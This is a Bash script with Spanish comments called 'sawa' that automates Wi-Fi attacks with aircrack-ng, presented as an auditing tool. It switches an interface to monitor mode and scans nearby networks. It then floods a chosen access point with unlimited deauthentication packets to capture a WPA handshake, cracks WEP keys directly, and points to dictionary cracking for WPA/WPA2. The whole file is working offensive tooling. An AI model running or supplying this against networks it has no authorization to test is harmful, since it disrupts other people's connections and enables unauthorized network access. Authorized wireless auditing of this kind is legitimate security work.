#!/bin/bash
# sawa - Bash script to automate wireless auditing using aircrack-ng tools.
#    Copyright (C) 2024  Mario Martin Sbarbaro and Cristián Adrián Trapp Dienst
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Mario Martin Sbarbaro - mmsbarbaro@gmail.com
# Cristián Adrián Trapp Dienst - trappdienstcristian@hotmail.com.

trap salir SIGINT

# Se definen los colores para el texto por salida estándar
Azul='\e[1;34m'
Red='\e[1;31m'
Green='\e[1;32m'
Amarillo='\033[0;33m'
Amarilo_Subrayado='\033[4;33m'
Apagar_Color='\e[0m'

# Función que se utiliza para capturar la combinación de teclas CRTL+C
salir(){
  if [[ $bandera_break -eq 1 ]]; then
    exit 1
  fi
  echo "Saliendo de sawa ..."
  bandera_break=1
}

# Se comprueba la existencia de la suite de aircrack-ng en el sistema
paquete_aircrack=$(dpkg --get-selections | grep -w "aircrack" | grep install | awk -F' ' '{print $1}')
if [[ $paquete_aircrack -ne "aircrack-ng" ]]; then
  echo "El paquete $paquete_aircrack NO se encuentra instalado en el sistema. Ejecute el siguiente comando:"
  echo "apt-get install aircrack-ng"
  exit 1
fi

# Se limpia la pantalla antes comenzar
clear

# Se presentan los titulares del script por pantalla
echo -e "${Azul}**************************************************************************************************${Apagar_Color}"
echo -e "${Azul}*** sawa - Bash script to automate wireless auditing using aircrack-ng tools.                  ***${Apagar_Color}"
echo -e "${Azul}*** Script Bash para automatizar la auditoría inalámbrica utilizando herramientas aircrack-ng. ***${Apagar_Color}"
echo -e "${Azul}**************************************************************************************************${Apagar_Color}"
echo ""

# Se obtienen las interfaces disponibles en el sistema
interfaces+=($(ip address show | grep "mtu" | awk -F: '{print $2}'))

echo -e "${Amarillo}Seleccione una interface de captura:${Apagar_Color}"

contador=1
# Se recorren las interfaces disponibles en el sistema
for iface in ${interfaces[@]}; do
  echo "$contador - $iface"
  contador=$(($contador + 1))
done

# Se lee la opción correspondiente a la interfaz que se utilizará en la captura
read interface_seleccionada

contador=1
modo_monitor=0

# Se recorren las interfaces para tomar la selccionada en la variable interface
for interface in "${interfaces[@]}"
  do
    if [[ $interface_seleccionada -eq $contador ]]; then
      # Se establece la interfaz en modo monitor
      sudo airmon-ng start $interface
      modo_monitor=1
    fi
    contador=$(($contador + 1))
  done

# Se inicia el escaneo de las redes wi-fi en la interfaz seleccionada
if [[ $modo_monitor -eq 1 ]]; then
  # Se capturan los paquetes de las redes inalámbricas detectadas por la placa wlan0mon
  sudo nohup airodump-ng wlan0mon -a -w /tmp/Scan_Wi-Fi --write-interval 1 &

  # Se muestran las redes inalámbricas que se detectan con airodump-ng
  while true; do
    sleep 5
    
    contador=1

    redes_inalambricas=()

    echo -e "Identificador - BSSID - canal - privacidad - cifrado - autenticación - fuerza de la señal - ESSID"
    
    while read linea; do
      
      BSSID=$(echo "$linea" | cut -d',' -f1)
      channel=$(echo "$linea" | cut -d',' -f4)
      privacy=$(echo "$linea" | cut -d',' -f6)
      cipher=$(echo "$linea" | cut -d',' -f7)
      authentication=$(echo "$linea" | cut -d',' -f8)
      power=$(echo "$linea" | cut -d',' -f9)
      power_positivo=$(echo "$power" | tr -d '-')
      ESSID=$(echo "$linea" | cut -d',' -f14)

      if [[ $BSSID == 'Station MAC' ]]; then
        break
      fi

      if [[ $BSSID != 'BSSID' ]]; then
        if [[ "$channel" != ' ' ]]; then
          if [[ $power_positivo -le '80' ]]; then
            echo -e "${Azul}$contador${Apagar_Color} - $BSSID - $channel - $privacy - $cipher - $authentication - $power - ${Azul}$ESSID${Apagar_Color}"
            redes_inalambricas+=("$contador,$BSSID,$channel,$privacy,$cipher,$authentication,$power,$ESSID")
            contador=$(($contador + 1))
          fi
        fi
      fi

    done < /tmp/Scan_Wi-Fi-01.csv

    echo -e "${Amarillo}CRTL+C cuando encuentre su red${Apagar_Color}"

    if [[ $bandera_break -eq 1 ]]; then
      break
    fi
  done

fi

bandera_break=0

echo -e "${Azul}$contador${Apagar_Color} - $BSSID - $channel - $privacy - $cipher - $authentication - $power - ${Azul}$ESSID${Apagar_Color}"

for red_inalambrica in "${redes_inalambricas[@]}"
do
  contador=$(echo $red_inalambrica | awk -F, '{print $1}')
  BSSID=$(echo $red_inalambrica | awk -F, '{print $2}')
  channel=$(echo $red_inalambrica | awk -F, '{print $3}')
  privacy=$(echo $red_inalambrica | awk -F, '{print $4}')
  cipher=$(echo $red_inalambrica | awk -F, '{print $5}')
  authentication=$(echo $red_inalambrica | awk -F, '{print $6}')
  power=$(echo $red_inalambrica | awk -F, '{print $7}')
  ESSID=$(echo $red_inalambrica | awk -F, '{print $8}')

  echo -e "${Azul}[$contador]${Apagar_Color} - $BSSID - $channel - $privacy - $cipher - $authentication - $power - ${Azul}$ESSID${Apagar_Color}"

done

echo -e "${Amarillo}Seleccione una red inalámbrica: ${Apagar_Color}"
read red_seleccionada

red_seleccionada=$(($red_seleccionada-1))

bssid=$(echo "${redes_inalambricas[$red_seleccionada]}" | awk -F, '{print $2}')

channel=$(echo "${redes_inalambricas[$red_seleccionada]}" | awk -F, '{print $3}')

essid=$(echo "${redes_inalambricas[$red_seleccionada]}" | awk -F, '{print $8}')

privacy=$(echo "${redes_inalambricas[$red_seleccionada]}" | awk -F, '{print $4}')

echo -e "${Azul}Iniciando la búsqueda del handshake de la red inalámbrica $essid ($bssid) ...${Apagar_Color}" 

if [[ $modo_monitor -eq 1 ]]; then

  # Se capturan los paquetes de la red inalámbrica seleccionada
  sudo nohup airodump-ng --bssid $bssid --channel $channel -w /tmp/Scan_Wi-Fi_$bssid --write-interval 1 wlan0mon &

  # Se inyectan paquetes en la red inalámbrica seleccionada, con el fin de obtener de forma más rápida el handshake 
  sudo nohup aireplay-ng -0 0 -a $bssid wlan0mon &

  while true; do
    sleep 5

    clear

    echo -e "${Azul}Obteniendo el handshake de la red inalámbrica $essid ($bssid) ... ${Apagar_Color}"

    while read linea; do
      echo $linea
    done < /tmp/Scan_Wi-Fi_$bssid-01.csv

    resultado=$(sudo aircrack-ng /tmp/Scan_Wi-Fi_$bssid-01.cap)

    echo $resultado

    if echo $resultado | grep "1 handshake"; then
      echo -e "${Azul}Handshake encontrado!. Copiando el archivo de la captura al directorio actual con el nombre $bssid.cap${Apagar_Color}"

      # Se hace una copia del archivo con la captura y el handshake
      cp /tmp/Scan_Wi-Fi_$bssid-01.cap $bssid.cap

      if [[ $privacy == 'WEP' ]]; then
        sudo aircrack-ng $bssid.cap
      fi

      if [[ $privacy == 'WPA' ]]; then
        echo "Utilizar la herramienta aircrack-ng con un diccionario y el archivo capturado."
      fi
      
      if [[ $privacy == 'WPA2' ]]; then
		echo "Utilizar la herramienta aircrack-ng con un diccionario y el archivo capturado."
      fi

      break
    fi

    if [[ $bandera_break -eq 1 ]]; then
      break
    fi

  done

fi

echo -e "${Red}Saliendo ...${Apagar_Color}"

# Se quita el monitor de la interface seleccionada
sudo airmon-ng stop wlan0mon
# Se eliminan los archivos generados por la herramienta airodump-ng
sudo rm /tmp/Scan_Wi-Fi-01.*
sudo rm /tmp/Scan_Wi-Fi_*

echo -e ";) ${Apagar_Color}"
